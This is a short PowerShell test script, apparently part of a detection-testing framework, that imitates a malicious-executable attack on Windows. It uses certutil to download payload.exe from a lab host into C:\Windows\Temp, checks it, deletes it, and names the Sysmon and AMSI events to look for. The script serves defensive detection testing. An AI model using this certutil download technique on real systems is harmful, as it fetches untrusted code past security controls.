# CADRE — WT068 — Malicious Executable
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT068 - Malicious Executable"
start_attack "068" "Malicious EXE"
step "Download payload from provisioning VM"
run_cmd "certutil -urlcache -split -f http://192.168.77.60:8081/payload.exe C:\Windows\Temp\payload.exe"
step "Verify download"
run_cmd "Get-ChildItem C:\Windows\Temp\payload.exe | Select-Object Name, Length"
step "Clean up"
run_cmd "Remove-Item C:\Windows\Temp\payload.exe -Force -ErrorAction SilentlyContinue"
result 0 "WT068 — check Sysmon EID 1 (exec from %TEMP%), Sysmon EID 3, AMSI"
